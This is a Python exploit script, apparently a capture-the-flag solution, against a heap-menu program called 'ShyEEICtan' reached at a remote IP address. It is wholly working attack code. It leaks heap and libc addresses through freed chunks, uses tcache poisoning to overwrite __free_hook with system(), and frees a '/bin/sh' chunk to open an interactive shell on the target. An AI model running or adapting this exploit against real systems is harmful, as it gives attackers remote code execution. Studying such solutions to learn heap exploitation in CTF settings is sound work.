from ptrlib import *

def add(schedule):
    sock.sendlineafter("> ", "1")
    sock.sendafter(">", schedule)
    return
def delete(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", str(index))
    return
def show():
    sock.sendlineafter("> ", "3")
    sock.recvline()
    sock.recvline()
    return sock.recvline()
def edit(index, data):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", str(index))
    sock.sendafter(">", data)
    return

# BUF_SIZE = 0x200
libc = ELF("./libc.so.6")
#sock = Process("./ShyEEICtan")
sock = Socket("3.112.113.4", 20000)
libc_main_arena = 0x3ebc40

# leak heap
add(p64(0) + p64(0x431))         # 0
add("1")                         # 1
add((p64(0) + p64(0x21)) * 0x10) # 2
delete(1)
delete(0)
heap_base = u64(show()[:8]) - 0x220
logger.info("heap = " + hex(heap_base))

# leak libc
for i in range(6):
    delete(0)
libc_base = u64(show()[:8]) - libc_main_arena - 0x60
logger.info("libc = " + hex(libc_base))

# tcache poisoning
edit(0, p64(libc_base + libc.symbol("__free_hook")))
add("/bin/sh") # 3
add(p64(libc_base + libc.symbol("system"))) # 4
delete(3)

sock.interactive()
